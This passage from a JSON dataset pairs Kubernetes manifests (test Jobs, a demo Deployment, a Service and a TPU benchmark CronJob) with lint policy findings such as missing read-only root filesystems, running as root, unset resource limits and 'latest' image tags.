    "manifest_yaml": "apiVersion: batch/v1\nkind: Job\nmetadata:\n  namespace: litmus\nspec:\n  template:\n    metadata:\n      name: litmus\n      labels:\n        app: postgres-deployment-litmus\n    spec:\n      serviceAccountName: litmus\n      containers:\n      - name: ansibletest\n        image: openebs/ansible-runner:ci\n        imagePullPolicy: Always\n        env:\n        - name: ANSIBLE_STDOUT_CALLBACK\n          value: default\n        - name: PROVIDER_STORAGE_CLASS\n          value: openebs-standalone\n        - name: APP_PVC\n          value: pgdata-claim\n        - name: APP_LABEL\n          value: app=pgset\n        - name: APP_NAMESPACE\n          value: app-pgres-ns\n        - name: DEPLOY_TYPE\n          value: statefulset\n        command:\n        - /bin/bash\n        args:\n        - -c\n        - ansible-playbook ./crunchy-postgres/deployers/test.yml -i /etc/ansible/hosts\n          -v; exit 0\n",
    "policy_id": "no-read-only-root-fs",
    "violation_text": "container \"ansibletest\" does not have a read-only root file system"
  },
  {
    "id": "7468",
    "manifest_path": "data/manifests/the_stack_sample/sample_2730.yaml",
    "manifest_yaml": "apiVersion: batch/v1\nkind: Job\nmetadata:\n  namespace: litmus\nspec:\n  template:\n    metadata:\n      name: litmus\n      labels:\n        app: postgres-deployment-litmus\n    spec:\n      serviceAccountName: litmus\n      containers:\n      - name: ansibletest\n        image: openebs/ansible-runner:ci\n        imagePullPolicy: Always\n        env:\n        - name: ANSIBLE_STDOUT_CALLBACK\n          value: default\n        - name: PROVIDER_STORAGE_CLASS\n          value: openebs-standalone\n        - name: APP_PVC\n          value: pgdata-claim\n        - name: APP_LABEL\n          value: app=pgset\n        - name: APP_NAMESPACE\n          value: app-pgres-ns\n        - name: DEPLOY_TYPE\n          value: statefulset\n        command:\n        - /bin/bash\n        args:\n        - -c\n        - ansible-playbook ./crunchy-postgres/deployers/test.yml -i /etc/ansible/hosts\n          -v; exit 0\n",
    "policy_id": "non-existent-service-account",
    "violation_text": "serviceAccount \"litmus\" not found"
  },
  {
    "id": "7469",
    "manifest_path": "data/manifests/the_stack_sample/sample_2730.yaml",
    "manifest_yaml": "apiVersion: batch/v1\nkind: Job\nmetadata:\n  namespace: litmus\nspec:\n  template:\n    metadata:\n      name: litmus\n      labels:\n        app: postgres-deployment-litmus\n    spec:\n      serviceAccountName: litmus\n      containers:\n      - name: ansibletest\n        image: openebs/ansible-runner:ci\n        imagePullPolicy: Always\n        env:\n        - name: ANSIBLE_STDOUT_CALLBACK\n          value: default\n        - name: PROVIDER_STORAGE_CLASS\n          value: openebs-standalone\n        - name: APP_PVC\n          value: pgdata-claim\n        - name: APP_LABEL\n          value: app=pgset\n        - name: APP_NAMESPACE\n          value: app-pgres-ns\n        - name: DEPLOY_TYPE\n          value: statefulset\n        command:\n        - /bin/bash\n        args:\n        - -c\n        - ansible-playbook ./crunchy-postgres/deployers/test.yml -i /etc/ansible/hosts\n          -v; exit 0\n",
    "policy_id": "run-as-non-root",
    "violation_text": "container \"ansibletest\" is not set to runAsNonRoot"
  },
  {
    "id": "7470",
    "manifest_path": "data/manifests/the_stack_sample/sample_2730.yaml",
    "manifest_yaml": "apiVersion: batch/v1\nkind: Job\nmetadata:\n  namespace: litmus\nspec:\n  template:\n    metadata:\n      name: litmus\n      labels:\n        app: postgres-deployment-litmus\n    spec:\n      serviceAccountName: litmus\n      containers:\n      - name: ansibletest\n        image: openebs/ansible-runner:ci\n        imagePullPolicy: Always\n        env:\n        - name: ANSIBLE_STDOUT_CALLBACK\n          value: default\n        - name: PROVIDER_STORAGE_CLASS\n          value: openebs-standalone\n        - name: APP_PVC\n          value: pgdata-claim\n        - name: APP_LABEL\n          value: app=pgset\n        - name: APP_NAMESPACE\n          value: app-pgres-ns\n        - name: DEPLOY_TYPE\n          value: statefulset\n        command:\n        - /bin/bash\n        args:\n        - -c\n        - ansible-playbook ./crunchy-postgres/deployers/test.yml -i /etc/ansible/hosts\n          -v; exit 0\n",
    "policy_id": "unset-cpu-requirements",
    "violation_text": "container \"ansibletest\" has cpu request 0"
  },
  {
    "id": "7471",
    "manifest_path": "data/manifests/the_stack_sample/sample_2730.yaml",
    "manifest_yaml": "apiVersion: batch/v1\nkind: Job\nmetadata:\n  namespace: litmus\nspec:\n  template:\n    metadata:\n      name: litmus\n      labels:\n        app: postgres-deployment-litmus\n    spec:\n      serviceAccountName: litmus\n      containers:\n      - name: ansibletest\n        image: openebs/ansible-runner:ci\n        imagePullPolicy: Always\n        env:\n        - name: ANSIBLE_STDOUT_CALLBACK\n          value: default\n        - name: PROVIDER_STORAGE_CLASS\n          value: openebs-standalone\n        - name: APP_PVC\n          value: pgdata-claim\n        - name: APP_LABEL\n          value: app=pgset\n        - name: APP_NAMESPACE\n          value: app-pgres-ns\n        - name: DEPLOY_TYPE\n          value: statefulset\n        command:\n        - /bin/bash\n        args:\n        - -c\n        - ansible-playbook ./crunchy-postgres/deployers/test.yml -i /etc/ansible/hosts\n          -v; exit 0\n",
    "policy_id": "unset-memory-requirements",
    "violation_text": "container \"ansibletest\" has memory limit 0"
  },
  {
    "id": "7472",
    "manifest_path": "data/manifests/the_stack_sample/sample_2732.yaml",
    "manifest_yaml": "apiVersion: apps/v1\nkind: Deployment\nmetadata:\n  name: k9o-demo-backend-v0\n  namespace: k9o-demo\nspec:\n  replicas: 1\n  selector:\n    matchLabels:\n      app: k9o-demo-backend\n      version: v0\n      env: prod\n  template:\n    metadata:\n      labels:\n        app: k9o-demo-backend\n        version: v0\n        env: prod\n    spec:\n      containers:\n      - image: kvn0218/kuma-demo-be:latest\n        name: kuma-be\n        env:\n        - name: POSTGRES_HOST\n          value: postgres\n        - name: SPECIAL_OFFER\n          value: 'false'\n        - name: REDIS_HOST\n          value: redis\n        imagePullPolicy: IfNotPresent\n        ports:\n        - containerPort: 3001\n",
    "policy_id": "latest-tag",
    "violation_text": "The container \"kuma-be\" is using an invalid container image, \"kvn0218/kuma-demo-be:latest\". Please use images that are not blocked by the `BlockList` criteria : [\".*:(latest)$\" \"^[^:]*$\" \"(.*/[^:]+)$\"]"
  },
  {
    "id": "7473",
    "manifest_path": "data/manifests/the_stack_sample/sample_2732.yaml",
    "manifest_yaml": "apiVersion: apps/v1\nkind: Deployment\nmetadata:\n  name: k9o-demo-backend-v0\n  namespace: k9o-demo\nspec:\n  replicas: 1\n  selector:\n    matchLabels:\n      app: k9o-demo-backend\n      version: v0\n      env: prod\n  template:\n    metadata:\n      labels:\n        app: k9o-demo-backend\n        version: v0\n        env: prod\n    spec:\n      containers:\n      - image: kvn0218/kuma-demo-be:latest\n        name: kuma-be\n        env:\n        - name: POSTGRES_HOST\n          value: postgres\n        - name: SPECIAL_OFFER\n          value: 'false'\n        - name: REDIS_HOST\n          value: redis\n        imagePullPolicy: IfNotPresent\n        ports:\n        - containerPort: 3001\n",
    "policy_id": "no-read-only-root-fs",
    "violation_text": "container \"kuma-be\" does not have a read-only root file system"
  },
  {
    "id": "7474",
    "manifest_path": "data/manifests/the_stack_sample/sample_2732.yaml",
    "manifest_yaml": "apiVersion: apps/v1\nkind: Deployment\nmetadata:\n  name: k9o-demo-backend-v0\n  namespace: k9o-demo\nspec:\n  replicas: 1\n  selector:\n    matchLabels:\n      app: k9o-demo-backend\n      version: v0\n      env: prod\n  template:\n    metadata:\n      labels:\n        app: k9o-demo-backend\n        version: v0\n        env: prod\n    spec:\n      containers:\n      - image: kvn0218/kuma-demo-be:latest\n        name: kuma-be\n        env:\n        - name: POSTGRES_HOST\n          value: postgres\n        - name: SPECIAL_OFFER\n          value: 'false'\n        - name: REDIS_HOST\n          value: redis\n        imagePullPolicy: IfNotPresent\n        ports:\n        - containerPort: 3001\n",
    "policy_id": "run-as-non-root",
    "violation_text": "container \"kuma-be\" is not set to runAsNonRoot"
  },
  {
    "id": "7475",
    "manifest_path": "data/manifests/the_stack_sample/sample_2732.yaml",
    "manifest_yaml": "apiVersion: apps/v1\nkind: Deployment\nmetadata:\n  name: k9o-demo-backend-v0\n  namespace: k9o-demo\nspec:\n  replicas: 1\n  selector:\n    matchLabels:\n      app: k9o-demo-backend\n      version: v0\n      env: prod\n  template:\n    metadata:\n      labels:\n        app: k9o-demo-backend\n        version: v0\n        env: prod\n    spec:\n      containers:\n      - image: kvn0218/kuma-demo-be:latest\n        name: kuma-be\n        env:\n        - name: POSTGRES_HOST\n          value: postgres\n        - name: SPECIAL_OFFER\n          value: 'false'\n        - name: REDIS_HOST\n          value: redis\n        imagePullPolicy: IfNotPresent\n        ports:\n        - containerPort: 3001\n",
    "policy_id": "unset-cpu-requirements",
    "violation_text": "container \"kuma-be\" has cpu request 0"
  },
  {
    "id": "7476",
    "manifest_path": "data/manifests/the_stack_sample/sample_2732.yaml",
    "manifest_yaml": "apiVersion: apps/v1\nkind: Deployment\nmetadata:\n  name: k9o-demo-backend-v0\n  namespace: k9o-demo\nspec:\n  replicas: 1\n  selector:\n    matchLabels:\n      app: k9o-demo-backend\n      version: v0\n      env: prod\n  template:\n    metadata:\n      labels:\n        app: k9o-demo-backend\n        version: v0\n        env: prod\n    spec:\n      containers:\n      - image: kvn0218/kuma-demo-be:latest\n        name: kuma-be\n        env:\n        - name: POSTGRES_HOST\n          value: postgres\n        - name: SPECIAL_OFFER\n          value: 'false'\n        - name: REDIS_HOST\n          value: redis\n        imagePullPolicy: IfNotPresent\n        ports:\n        - containerPort: 3001\n",
    "policy_id": "unset-memory-requirements",
    "violation_text": "container \"kuma-be\" has memory limit 0"
  },
  {
    "id": "7477",
    "manifest_path": "data/manifests/the_stack_sample/sample_2733.yaml",
    "manifest_yaml": "apiVersion: v1\nkind: Service\nmetadata:\n  labels:\n    app: pet-clinic\n  name: pet-clinic\nspec:\n  type: ClusterIP\n  ports:\n  - protocol: TCP\n    port: 9000\n    targetPort: 9000\n  selector:\n    app: pet-clinic\n",
    "policy_id": "dangling-service",
    "violation_text": "no pods found matching service labels (map[app:pet-clinic])"
  },
  {
    "id": "7478",
    "manifest_path": "data/manifests/the_stack_sample/sample_2734.yaml",
    "manifest_yaml": "apiVersion: batch/v1beta1\nkind: CronJob\nmetadata:\n  labels:\n    accelerator: v3-32\n    benchmarkId: tf-nightly-transformer-perfzero-v3-32\n    frameworkVersion: tf-nightly\n    mode: perfzero\n    model: transformer\n  name: tf-nightly-transformer-perfzero-v3-32\n  namespace: automated\nspec:\n  jobTemplate:\n    template:\n      metadata:\n        annotations:\n          reserved.cloud-tpus.google.com: 'false'\n          tf-version.cloud-tpus.google.com: nightly\n      spec:\n        containers:\n        - env:\n          - name: POD_NAME\n            valueFrom:\n              fieldRef:\n                fieldPath: metadata.name\n          - name: POD_NAMESPACE\n            valueFrom:\n              fieldRef:\n                fieldPath: metadata.namespace\n          image: gcr.io/xl-ml-test/health-monitor:stable\n          imagePullPolicy: Always\n          name: monitor\n        - args:\n          - /bin/bash\n          - -c\n          - \"set -u\\nset -e\\nset -x\\n\\nsed -i 's_gs://tf-perfzero-data/bert_$(PERFZERO_DATA_DIR)_g'\\\n            \\ /garden/official/benchmark/bert_squad_benchmark.py\\nsed -i 's_gs://tf-perfzero-data_$(PERFZERO_DATA_DIR)_g'\\\n            \\ /garden/official/benchmark/retinanet_benchmark.py\\nsed -i 's_gs://mlcompass-data/transformer_$(PERFZERO_DATA_DIR)_g'\\\n            \\ /garden/official/benchmark/transformer_benchmark.py\\nsed -i 's_gs://mlcompass-data/imagenet/imagenet-2012-tfrecord_$(PERFZERO_DATA_DIR)/imagenet_g'\\\n            \\ /garden/official/benchmark/resnet_ctl_imagenet_benchmark.py\\nsed -i\\\n            \\ 's/wmt32k-en2de-official/transformer/g' /garden/official/benchmark/transformer_benchmark.py\\n\\\n            \\nif [ -v TPU_NAME ]; then\\n  export BENCHMARK_TPU=${TPU_NAME#*/}\\nfi\\n\\\n            \\npython3 /benchmarks/perfzero/lib/benchmark.py --gcloud_key_file= --bigquery_project_name=xl-ml-test\\\n            \\ --bigquery_dataset_table_name=perfzero_dataset.perfzero_table --benchmark_methods=official.benchmark.transformer_benchmark.TransformerBigKerasBenchmarkReal.benchmark_4x4_tpu\\\n            \\ --output_gcs_url=$(MODEL_DIR) --root_data_dir=$(PERFZERO_DATA_DIR)\\n\"\n          env:\n          - name: POD_NAME\n            valueFrom:\n              fieldRef:\n                fieldPath: metadata.name\n          - name: POD_UID\n            valueFrom:\n              fieldRef:\n                fieldPath: metadata.uid\n          - name: POD_NAMESPACE\n            valueFrom:\n              fieldRef:\n                fieldPath: metadata.namespace\n          - name: JOB_NAME\n            valueFrom:\n              fieldRef:\n                fieldPath: metadata.labels['job-name']\n          - name: MODEL_DIR\n            value: $(OUTPUT_BUCKET)/tf-nightly/transformer/perfzero/v3-32/$(JOB_NAME)\n          - name: BENCHMARK_OUTPUT_DIR\n            value: $(MODEL_DIR)\n          envFrom:\n          - configMapRef:\n              name: gcs-buckets\n          image: gcr.io/xl-ml-test/tensorflow:nightly\n          imagePullPolicy: Always\n          name: train\n          resources:\n            limits:\n              cloud-tpus.google.com/v3: 32\n            requests:\n              cpu: 2\n              memory: 20G\n          volumeMounts:\n          - mountPath: /dev/shm\n            name: dshm\n            readOnly: false\n        initContainers:\n        - env:\n          - name: POD_NAME\n            valueFrom:\n              fieldRef:\n                fieldPath: metadata.name\n          - name: POD_UID\n            valueFrom:\n              fieldRef:\n                fieldPath: metadata.uid\n          - name: POD_NAMESPACE\n            valueFrom:\n              fieldRef:\n                fieldPath: metadata.namespace\n          - name: JOB_NAME\n            valueFrom:\n              fieldRef:\n                fieldPath: metadata.labels['job-name']\n          - name: MODEL_DIR\n            value: $(OUTPUT_BUCKET)/tf-nightly/transformer/perfzero/v3-32/$(JOB_NAME)\n          - name: METRIC_CONFIG\n            value: \"{\\n \\\"metric_collection_config\\\": {\\n  \\\"default_aggregation_strategies\\\"\\\n              : [\\n   \\\"final\\\"\\n  ],\\n  \\\"metric_to_aggregation_strategies\\\": {\\n\\\n              \\   \\\"examples_per_second\\\": [\\n    \\\"average\\\"\\n   ]\\n  },\\n  \\\"use_run_name_prefix\\\"\\\n              : true,\\n  \\\"write_to_bigquery\\\": true\\n },\\n \\\"regression_test_config\\\"\\\n              : {\\n  \\\"metric_success_conditions\\\": {\\n   \\\"exp_per_second\\\": {\\n\\\n              \\    \\\"comparison\\\": \\\"greater_or_equal\\\",\\n    \\\"success_threshold\\\"\\\n              : {\\n     \\\"stddevs_from_mean\\\": 3\\n    },\\n    \\\"wait_for_n_points_of_history\\\"\\\n              : 10\\n   },\\n   \\\"startup_time\\\": {\\n    \\\"comparison\\\": \\\"less\\\",\\n\\\n              \\    \\\"success_threshold\\\": {\\n     \\\"stddevs_from_mean\\\": 4\\n    },\\n\\\n              \\    \\\"wait_for_n_points_of_history\\\": 10\\n   }\\n  }\\n },\\n \\\"test_name\\\"\\\n              : \\\"tf-nightly-transformer-perfzero-v3-32\\\"\\n}\\n\"\n          envFrom:\n          - configMapRef:\n              name: gcs-buckets\n          image: gcr.io/xl-ml-test/publisher:stable\n          imagePullPolicy: Always\n          name: publisher\n        volumes:\n        - emptyDir:\n            medium: Memory\n          name: dshm\n",
    "policy_id": "no-read-only-root-fs",
    "violation_text": "container \"monitor\" does not have a read-only root file system"
  },
  {
    "id": "7479",
    "manifest_path": "data/manifests/the_stack_sample/sample_2734.yaml",
    "manifest_yaml": "apiVersion: batch/v1beta1\nkind: CronJob\nmetadata:\n  labels:\n    accelerator: v3-32\n    benchmarkId: tf-nightly-transformer-perfzero-v3-32\n    frameworkVersion: tf-nightly\n    mode: perfzero\n    model: transformer\n  name: tf-nightly-transformer-perfzero-v3-32\n  namespace: automated\nspec:\n  jobTemplate:\n    template:\n      metadata:\n        annotations:\n          reserved.cloud-tpus.google.com: 'false'\n          tf-version.cloud-tpus.google.com: nightly\n      spec:\n        containers:\n        - env:\n          - name: POD_NAME\n            valueFrom:\n              fieldRef:\n                fieldPath: metadata.name\n          - name: POD_NAMESPACE\n            valueFrom:\n              fieldRef:\n                fieldPath: metadata.namespace\n          image: gcr.io/xl-ml-test/health-monitor:stable\n          imagePullPolicy: Always\n          name: monitor\n        - args:\n          - /bin/bash\n          - -c\n          - \"set -u\\nset -e\\nset -x\\n\\nsed -i 's_gs://tf-perfzero-data/bert_$(PERFZERO_DATA_DIR)_g'\\\n            \\ /garden/official/benchmark/bert_squad_benchmark.py\\nsed -i 's_gs://tf-perfzero-data_$(PERFZERO_DATA_DIR)_g'\\\n            \\ /garden/official/benchmark/retinanet_benchmark.py\\nsed -i 's_gs://mlcompass-data/transformer_$(PERFZERO_DATA_DIR)_g'\\\n            \\ /garden/official/benchmark/transformer_benchmark.py\\nsed -i 's_gs://mlcompass-data/imagenet/imagenet-2012-tfrecord_$(PERFZERO_DATA_DIR)/imagenet_g'\\\n            \\ /garden/official/benchmark/resnet_ctl_imagenet_benchmark.py\\nsed -i\\\n            \\ 's/wmt32k-en2de-official/transformer/g' /garden/official/benchmark/transformer_benchmark.py\\n\\\n            \\nif [ -v TPU_NAME ]; then\\n  export BENCHMARK_TPU=${TPU_NAME#*/}\\nfi\\n\\\n            \\npython3 /benchmarks/perfzero/lib/benchmark.py --gcloud_key_file= --bigquery_project_name=xl-ml-test\\\n            \\ --bigquery_dataset_table_name=perfzero_dataset.perfzero_table --benchmark_methods=official.benchmark.transformer_benchmark.TransformerBigKerasBenchmarkReal.benchmark_4x4_tpu\\\n            \\ --output_gcs_url=$(MODEL_DIR) --root_data_dir=$(PERFZERO_DATA_DIR)\\n\"\n          env:\n          - name: POD_NAME\n            valueFrom:\n              fieldRef:\n                fieldPath: metadata.name\n          - name: POD_UID\n            valueFrom:\n              fieldRef:\n                fieldPath: metadata.uid\n          - name: POD_NAMESPACE\n            valueFrom:\n              fieldRef:\n                fieldPath: metadata.namespace\n          - name: JOB_NAME\n            valueFrom:\n              fieldRef:\n                fieldPath: metadata.labels['job-name']\n          - name: MODEL_DIR\n            value: $(OUTPUT_BUCKET)/tf-nightly/transformer/perfzero/v3-32/$(JOB_NAME)\n          - name: BENCHMARK_OUTPUT_DIR\n            value: $(MODEL_DIR)\n          envFrom:\n          - configMapRef:\n              name: gcs-buckets\n          image: gcr.io/xl-ml-test/tensorflow:nightly\n          imagePullPolicy: Always\n          name: train\n          resources:\n            limits:\n              cloud-tpus.google.com/v3: 32\n            requests:\n              cpu: 2\n              memory: 20G\n          volumeMounts:\n          - mountPath: /dev/shm\n            name: dshm\n            readOnly: false\n        initContainers:\n        - env:\n          - name: POD_NAME\n            valueFrom:\n              fieldRef:\n                fieldPath: metadata.name\n          - name: POD_UID\n            valueFrom:\n              fieldRef:\n                fieldPath: metadata.uid\n          - name: POD_NAMESPACE\n            valueFrom:\n              fieldRef:\n                fieldPath: metadata.namespace\n          - name: JOB_NAME\n            valueFrom:\n              fieldRef:\n                fieldPath: metadata.labels['job-name']\n          - name: MODEL_DIR\n            value: $(OUTPUT_BUCKET)/tf-nightly/transformer/perfzero/v3-32/$(JOB_NAME)\n          - name: METRIC_CONFIG\n            value: \"{\\n \\\"metric_collection_config\\\": {\\n  \\\"default_aggregation_strategies\\\"\\\n              : [\\n   \\\"final\\\"\\n  ],\\n  \\\"metric_to_aggregation_strategies\\\": {\\n\\\n              \\   \\\"examples_per_second\\\": [\\n    \\\"average\\\"\\n   ]\\n  },\\n  \\\"use_run_name_prefix\\\"\\\n              : true,\\n  \\\"write_to_bigquery\\\": true\\n },\\n \\\"regression_test_config\\\"\\\n              : {\\n  \\\"metric_success_conditions\\\": {\\n   \\\"exp_per_second\\\": {\\n\\\n              \\    \\\"comparison\\\": \\\"greater_or_equal\\\",\\n    \\\"success_threshold\\\"\\\n              : {\\n     \\\"stddevs_from_mean\\\": 3\\n    },\\n    \\\"wait_for_n_points_of_history\\\"\\\n              : 10\\n   },\\n   \\\"startup_time\\\": {\\n    \\\"comparison\\\": \\\"less\\\",\\n\\\n              \\    \\\"success_threshold\\\": {\\n     \\\"stddevs_from_mean\\\": 4\\n    },\\n\\\n              \\    \\\"wait_for_n_points_of_history\\\": 10\\n   }\\n  }\\n },\\n \\\"test_name\\\"\\\n              : \\\"tf-nightly-transformer-perfzero-v3-32\\\"\\n}\\n\"\n          envFrom:\n          - configMapRef:\n              name: gcs-buckets\n          image: gcr.io/xl-ml-test/publisher:stable\n          imagePullPolicy: Always\n          name: publisher\n        volumes:\n        - emptyDir:\n            medium: Memory\n          name: dshm\n",
    "policy_id": "no-read-only-root-fs",
    "violation_text": "container \"publisher\" does not have a read-only root file system"
  },
  {
    "id": "7480",
    "manifest_path": "data/manifests/the_stack_sample/sample_2734.yaml",
    "manifest_yaml": "apiVersion: batch/v1beta1\nkind: CronJob\nmetadata:\n  labels:\n    accelerator: v3-32\n    benchmarkId: tf-nightly-transformer-perfzero-v3-32\n    frameworkVersion: tf-nightly\n    mode: perfzero\n    model: transformer\n  name: tf-nightly-transformer-perfzero-v3-32\n  namespace: automated\nspec:\n  jobTemplate:\n    template:\n      metadata:\n        annotations:\n          reserved.cloud-tpus.google.com: 'false'\n          tf-version.cloud-tpus.google.com: nightly\n      spec:\n        containers:\n        - env:\n          - name: POD_NAME\n            valueFrom:\n              fieldRef:\n                fieldPath: metadata.name\n          - name: POD_NAMESPACE\n            valueFrom:\n              fieldRef:\n                fieldPath: metadata.namespace\n          image: gcr.io/xl-ml-test/health-monitor:stable\n          imagePullPolicy: Always\n          name: monitor\n        - args:\n          - /bin/bash\n          - -c\n          - \"set -u\\nset -e\\nset -x\\n\\nsed -i 's_gs://tf-perfzero-data/bert_$(PERFZERO_DATA_DIR)_g'\\\n            \\ /garden/official/benchmark/bert_squad_benchmark.py\\nsed -i 's_gs://tf-perfzero-data_$(PERFZERO_DATA_DIR)_g'\\\n            \\ /garden/official/benchmark/retinanet_benchmark.py\\nsed -i 's_gs://mlcompass-data/transformer_$(PERFZERO_DATA_DIR)_g'\\\n            \\ /garden/official/benchmark/transformer_benchmark.py\\nsed -i 's_gs://mlcompass-data/imagenet/imagenet-2012-tfrecord_$(PERFZERO_DATA_DIR)/imagenet_g'\\\n            \\ /garden/official/benchmark/resnet_ctl_imagenet_benchmark.py\\nsed -i\\\n            \\ 's/wmt32k-en2de-official/transformer/g' /garden/official/benchmark/transformer_benchmark.py\\n\\\n            \\nif [ -v TPU_NAME ]; then\\n  export BENCHMARK_TPU=${TPU_NAME#*/}\\nfi\\n\\\n            \\npython3 /benchmarks/perfzero/lib/benchmark.py --gcloud_key_file= --bigquery_project_name=xl-ml-test\\\n            \\ --bigquery_dataset_table_name=perfzero_dataset.perfzero_table --benchmark_methods=official.benchmark.transformer_benchmark.TransformerBigKerasBenchmarkReal.benchmark_4x4_tpu\\\n            \\ --output_gcs_url=$(MODEL_DIR) --root_data_dir=$(PERFZERO_DATA_DIR)\\n\"\n          env:\n          - name: POD_NAME\n            valueFrom:\n              fieldRef:\n                fieldPath: metadata.name\n          - name: POD_UID\n            valueFrom:\n              fieldRef:\n                fieldPath: metadata.uid\n          - name: POD_NAMESPACE\n            valueFrom:\n              fieldRef:\n                fieldPath: metadata.namespace\n          - name: JOB_NAME\n            valueFrom:\n              fieldRef:\n                fieldPath: metadata.labels['job-name']\n          - name: MODEL_DIR\n            value: $(OUTPUT_BUCKET)/tf-nightly/transformer/perfzero/v3-32/$(JOB_NAME)\n          - name: BENCHMARK_OUTPUT_DIR\n            value: $(MODEL_DIR)\n          envFrom:\n          - configMapRef:\n              name: gcs-buckets\n          image: gcr.io/xl-ml-test/tensorflow:nightly\n          imagePullPolicy: Always\n          name: train\n          resources:\n            limits:\n              cloud-tpus.google.com/v3: 32\n            requests:\n              cpu: 2\n              memory: 20G\n          volumeMounts:\n          - mountPath: /dev/shm\n            name: dshm\n            readOnly: false\n        initContainers:\n        - env:\n          - name: POD_NAME\n            valueFrom:\n              fieldRef:\n                fieldPath: metadata.name\n          - name: POD_UID\n            valueFrom:\n              fieldRef:\n                fieldPath: metadata.uid\n          - name: POD_NAMESPACE\n            valueFrom:\n              fieldRef:\n                fieldPath: metadata.namespace\n          - name: JOB_NAME\n            valueFrom:\n              fieldRef:\n                fieldPath: metadata.labels['job-name']\n          - name: MODEL_DIR\n            value: $(OUTPUT_BUCKET)/tf-nightly/transformer/perfzero/v3-32/$(JOB_NAME)\n          - name: METRIC_CONFIG\n            value: \"{\\n \\\"metric_collection_config\\\": {\\n  \\\"default_aggregation_strategies\\\"\\\n              : [\\n   \\\"final\\\"\\n  ],\\n  \\\"metric_to_aggregation_strategies\\\": {\\n\\\n              \\   \\\"examples_per_second\\\": [\\n    \\\"average\\\"\\n   ]\\n  },\\n  \\\"use_run_name_prefix\\\"\\\n              : true,\\n  \\\"write_to_bigquery\\\": true\\n },\\n \\\"regression_test_config\\\"\\\n              : {\\n  \\\"metric_success_conditions\\\": {\\n   \\\"exp_per_second\\\": {\\n\\\n              \\    \\\"comparison\\\": \\\"greater_or_equal\\\",\\n    \\\"success_threshold\\\"\\\n              : {\\n     \\\"stddevs_from_mean\\\": 3\\n    },\\n    \\\"wait_for_n_points_of_history\\\"\\\n              : 10\\n   },\\n   \\\"startup_time\\\": {\\n    \\\"comparison\\\": \\\"less\\\",\\n\\\n              \\    \\\"success_threshold\\\": {\\n     \\\"stddevs_from_mean\\\": 4\\n    },\\n\\\n              \\    \\\"wait_for_n_points_of_history\\\": 10\\n   }\\n  }\\n },\\n \\\"test_name\\\"\\\n              : \\\"tf-nightly-transformer-perfzero-v3-32\\\"\\n}\\n\"\n          envFrom:\n          - configMapRef:\n              name: gcs-buckets\n          image: gcr.io/xl-ml-test/publisher:stable\n          imagePullPolicy: Always\n          name: publisher\n        volumes:\n        - emptyDir:\n            medium: Memory\n          name: dshm\n",
    "policy_id": "no-read-only-root-fs",
    "violation_text": "container \"train\" does not have a read-only root file system"
  },
  {
    "id": "7481",
    "manifest_path": "data/manifests/the_stack_sample/sample_2734.yaml",
    "manifest_yaml": "apiVersion: batch/v1beta1\nkind: CronJob\nmetadata:\n  labels:\n    accelerator: v3-32\n    benchmarkId: tf-nightly-transformer-perfzero-v3-32\n    frameworkVersion: tf-nightly\n    mode: perfzero\n    model: transformer\n  name: tf-nightly-transformer-perfzero-v3-32\n  namespace: automated\nspec:\n  jobTemplate:\n    template:\n      metadata:\n        annotations:\n          reserved.cloud-tpus.google.com: 'false'\n          tf-version.cloud-tpus.google.com: nightly\n      spec:\n        containers:\n        - env:\n          - name: POD_NAME\n            valueFrom:\n              fieldRef:\n                fieldPath: metadata.name\n          - name: POD_NAMESPACE\n            valueFrom:\n              fieldRef:\n                fieldPath: metadata.namespace\n          image: gcr.io/xl-ml-test/health-monitor:stable\n          imagePullPolicy: Always\n          name: monitor\n        - args:\n          - /bin/bash\n          - -c\n          - \"set -u\\nset -e\\nset -x\\n\\nsed -i 's_gs://tf-perfzero-data/bert_$(PERFZERO_DATA_DIR)_g'\\\n            \\ /garden/official/benchmark/bert_squad_benchmark.py\\nsed -i 's_gs://tf-perfzero-data_$(PERFZERO_DATA_DIR)_g'\\\n            \\ /garden/official/benchmark/retinanet_benchmark.py\\nsed -i 's_gs://mlcompass-data/transformer_$(PERFZERO_DATA_DIR)_g'\\\n            \\ /garden/official/benchmark/transformer_benchmark.py\\nsed -i 's_gs://mlcompass-data/imagenet/imagenet-2012-tfrecord_$(PERFZERO_DATA_DIR)/imagenet_g'\\\n            \\ /garden/official/benchmark/resnet_ctl_imagenet_benchmark.py\\nsed -i\\\n            \\ 's/wmt32k-en2de-official/transformer/g' /garden/official/benchmark/transformer_benchmark.py\\n\\\n            \\nif [ -v TPU_NAME ]; then\\n  export BENCHMARK_TPU=${TPU_NAME#*/}\\nfi\\n\\\n            \\npython3 /benchmarks/perfzero/lib/benchmark.py --gcloud_key_file= --bigquery_project_name=xl-ml-test\\\n            \\ --bigquery_dataset_table_name=perfzero_dataset.perfzero_table --benchmark_methods=official.benchmark.transformer_benchmark.TransformerBigKerasBenchmarkReal.benchmark_4x4_tpu\\\n            \\ --output_gcs_url=$(MODEL_DIR) --root_data_dir=$(PERFZERO_DATA_DIR)\\n\"\n          env:\n          - name: POD_NAME\n            valueFrom:\n              fieldRef:\n                fieldPath: metadata.name\n          - name: POD_UID\n            valueFrom:\n              fieldRef:\n                fieldPath: metadata.uid\n          - name: POD_NAMESPACE\n            valueFrom:\n              fieldRef:\n                fieldPath: metadata.namespace\n          - name: JOB_NAME\n            valueFrom:\n              fieldRef:\n                fieldPath: metadata.labels['job-name']\n          - name: MODEL_DIR\n            value: $(OUTPUT_BUCKET)/tf-nightly/transformer/perfzero/v3-32/$(JOB_NAME)\n          - name: BENCHMARK_OUTPUT_DIR\n            value: $(MODEL_DIR)\n          envFrom:\n          - configMapRef:\n              name: gcs-buckets\n          image: gcr.io/xl-ml-test/tensorflow:nightly\n          imagePullPolicy: Always\n          name: train\n          resources:\n            limits:\n              cloud-tpus.google.com/v3: 32\n            requests:\n              cpu: 2\n              memory: 20G\n          volumeMounts:\n          - mountPath: /dev/shm\n            name: dshm\n            readOnly: false\n        initContainers:\n        - env:\n          - name: POD_NAME\n            valueFrom:\n              fieldRef:\n                fieldPath: metadata.name\n          - name: POD_UID\n            valueFrom:\n              fieldRef:\n                fieldPath: metadata.uid\n          - name: POD_NAMESPACE\n            valueFrom:\n              fieldRef:\n                fieldPath: metadata.namespace\n          - name: JOB_NAME\n            valueFrom:\n              fieldRef:\n                fieldPath: metadata.labels['job-name']\n          - name: MODEL_DIR\n            value: $(OUTPUT_BUCKET)/tf-nightly/transformer/perfzero/v3-32/$(JOB_NAME)\n          - name: METRIC_CONFIG\n            value: \"{\\n \\\"metric_collection_config\\\": {\\n  \\\"default_aggregation_strategies\\\"\\\n              : [\\n   \\\"final\\\"\\n  ],\\n  \\\"metric_to_aggregation_strategies\\\": 